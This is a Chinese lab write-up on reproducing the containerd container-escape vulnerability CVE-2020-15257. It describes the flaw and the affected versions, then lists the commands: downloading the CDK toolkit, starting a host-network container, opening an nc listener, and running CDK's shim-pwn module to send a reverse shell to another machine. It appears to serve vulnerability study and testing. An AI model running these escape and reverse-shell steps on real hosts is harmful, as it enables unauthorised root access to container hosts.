# **CVE-2020-15257 容器逃逸**

参考：https://blog.51cto.com/u_15274949/2922084
https://www.bilibili.com/read/cv9461827

## 1.漏洞简介

containerd是行业标准的容器运行时，可作为Linux和Windows的守护程序使用。在版本1.3.9和1.4.3之前的容器中，容器填充的API不正确地暴露给主机网络容器。填充程序的API套接字的访问控制验证了连接过程的有效UID为0，但没有以其他方式限制对抽象Unix域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效UID为0，但特权降低）导致新进程以提升的特权运行。

**影响版本**：containerd < 1.4.3	containerd < 1.3.9

**安全版本**：containerd >= 1.4.3	containerd >= 1.3.9

## 2.实验步骤

### 2.1 实验环境搭建

docker安装后containerd默认已安装，所以这里直接安装docker，查看dockerd版本

```bash
docker version
```

![image-20211201092026219](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211201092026219.png)

### 2.2 下载poc

漏洞利用使用github上的poc进行复现

```bash
mkdir cve-2020-15257

cd cve-2020-15257

wget https://github.com/cdk-team/CDK/releases/download/0.1.6/cdk_v0.1.6_release.tar.gz

tar -zxvf cdk_v0.1.6_release.tar.gz
```

![image-20211201092525907](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211201092525907.png)

### 2.3 查看内核版本

下载完成后查看虚拟机内核版本，将poc中对应的版本传到虚拟机中

```bash
uname -a
```

![image-20211201095741267](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211201095741267.png)

### 2.4 启动容器并拷贝poc

通过--net=host作为启动参数运行一个容器

```bash
docker run -it --net=host ubuntu:18.04 /bin/bash
```

![image-20211201100021261](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211201100021261.png)

把poc拷贝到容器里

```bash
docker ps |grep ubuntu
```

![image-20211201100205412](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211201100205412.png)

![image-20211201100224979](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211201100224979.png)

### 2.5 执行反弹shell

在另一台机器上（192.168.32.12）使用nc监听

```bash
nc -lvp 6767
```

![image-20211201100400715](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211201100400715.png)

在容器里执行poc反弹shell，完成逃逸

```bash
./cdk_linux_386 run shim-pwn 192.168.32.12 6767
```

![image-20211201100540961](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211201100540961.png)

![image-20211201100623706](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211201100623706.png)











